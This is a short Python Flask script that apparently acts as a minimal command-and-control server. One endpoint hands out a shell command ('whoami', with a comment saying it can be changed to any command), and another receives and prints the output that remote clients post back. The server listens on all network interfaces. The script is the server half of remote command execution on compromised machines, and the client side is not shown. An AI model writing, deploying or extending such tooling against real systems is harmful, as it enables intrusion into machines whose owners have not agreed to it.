from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/command', methods=['GET'])
def get_command():
    return jsonify(cmd="whoami")  # Change this to any command you want to test

@app.route('/result', methods=['POST'])
def post_result():
    data = request.get_json()
    print("Received result:", data.get("result", "No result"))
    return "OK"

import os

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
